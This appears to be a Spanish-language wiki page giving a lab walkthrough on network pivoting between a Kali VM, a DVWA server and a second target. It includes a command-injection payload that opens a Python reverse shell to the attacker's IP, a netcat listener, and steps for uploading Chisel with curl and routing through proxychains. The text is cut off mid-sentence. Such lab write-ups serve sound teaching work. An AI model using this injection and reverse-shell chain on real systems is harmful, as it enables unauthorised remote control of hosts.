---
title: Practica de pivotaje
description: En está pagina vamos a explicar como se hizo el pivotaje
published: true
date: 2024-12-11T17:47:05.082Z
tags: 
editor: markdown
dateCreated: 2024-12-11T17:47:05.082Z
---

# Práctica pivotaje
Bienvenido a la práctica de la máquina del pivotaje.
## Explicación
La práctica que vamos consiste en un pivotaje entre maquinas vulneradas.

### Requisitos
Debemos tener tres maquinas virtuales:
1. Máquina Kali o máquina Hacker, desde donde querremos infiltrarnos.
2. Servidor 1: Servidor DVWA en un Ubuntu Server.
3. Servidor 2: Servidor Devion7 en un Oracle.

Además deberemos tener dos redes NATs:
1. Red Kali - Dvwa
2. Red Dvwa - Devion7

### Configuración de DVWA
>  Partimos con que ya se ha instalado las máquinas necesarias y se han establecidos los requisitos correctamente.
{.is-info}

Dentro de la máquina DVWA, deberemos acudir a la ruta "**/etc/apach2/ports.conf**", aquí deberemos escribir:
`Listen 127.0.0.1:8000`

Tras esto acudiremos a la ruta "**/etc/apache2/sites-available**" y crearemos la carpeta "001-router.conf"
```bash
mkdir 001-internal.conf
```

Dentro de esta carpeta deberemos escribir lo siguiente:
```
<VirtualHost 127.0.0.1:8000>
	ServerName internal.cyberlab.local
  DocumentRoot /var/www/internal
 </VirtualHost>
```

Tras hecho esto, podremos hacer el comando:
```
sudo a2ensite 001-internal.conf
```

Y después deberemos hacer un:
```console
systemctl reload apache2
```

Con esto habremos creado un servicio en el puerto 8000, y será visible siempre y cuando hagamos una lectura en locahost:8000, esto lo usaremos más adelante para comprobar efectivamente que se ha hecho correctamente el pivotaje.

Haremos solo haremos una carpeta en la ruta indicada:
```console
vim /var/www/internal/index.html
```

Aquí pondremos lo que querramos para verificar que se ha hecho el pivotaje, un buen ejemplo puede ser:
"<h1 HOLAAA /h1>"
> Recuerda poner correctamente el <>.
{.is-warning}

## Ejecución
### Control de DVWA
Lo primero que haremos será establecer un puerto de escucha en Kali, para ello haremos un: 
```console
nc -lvnp (Puerto)
```
Tras esto, como Kali, deberemos acudir al apartado de DVWA:Command Injection. Aquí deberemos escribir lo siguiente:
```console
127.0.0.1;export RHOST="(IP de KALI)";export RPORT=(PUERTO DE KALI);nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' &
```

Esto lo hemos sacado de las siguiente URL: https://www.revshells.com
> En caso de error, comprueba que la dificultad está en low, el host y el puerto.
{.is-info}

Tras esto habremos hecho una shell reversa la cual tenemos total acceso y control. Ahora vamos a intentar crear un tunnel de comunicación entre la Kali y el DVWA, para ello vamos a usar Chisel. Lo primero que haremos será descargarnos el software en: https://github.com/jpillora/chisel/releases

Y nos descargaremos aquel fichero que ponga Linux_amd64.gz

Una vez descargado, lo descomprimimos y lo haremos un ejecutable. Eso lo haremos con los siguientes comandos:
```console
gzip -d chisel_1.10.1_linux_amd64.gz
mv chisel_1.10.1_linux_amd64 chisel
chmod +x chisel
```

Este archivo lo deberemos subir a la máquina de DVWA, para ello deberemos crear un servicio web en Kali con el siguiente comando:
```console
python3 -m http.server
```
> Importante ejecutar este comando en la misma cartepa donde esta el chisel descargado.
{.is-info}

Y ahora en la máquina de DVWA, vamos a poner:
```console
curl http://(maquinaKali)/chisel -o chisel
```

Si hacemos esto de forma correcta, la máquina DVWA habrá descargado el fichero, podemos comprobarlo con un ls.

Perfecto, ahora vamos a modificar el Socks5. Esto es para poder establecer una conexión muchisimo mas comoda entre Kali y DVWA, para ello vamos a tener que modificar lo siguiente:
```console
nano /etc/proxychains4.conf
```
Deberemos fijarnos que en la primera zonas de texto, esté presente **strict_chain** y después al final deberemos comentar la linea **socks4 127.0.0.1 9050**, y escribiremos en su lugar **socks5 127.0.0.1 1080**.
![image.png](/image.png)

Luego en la herramienta de 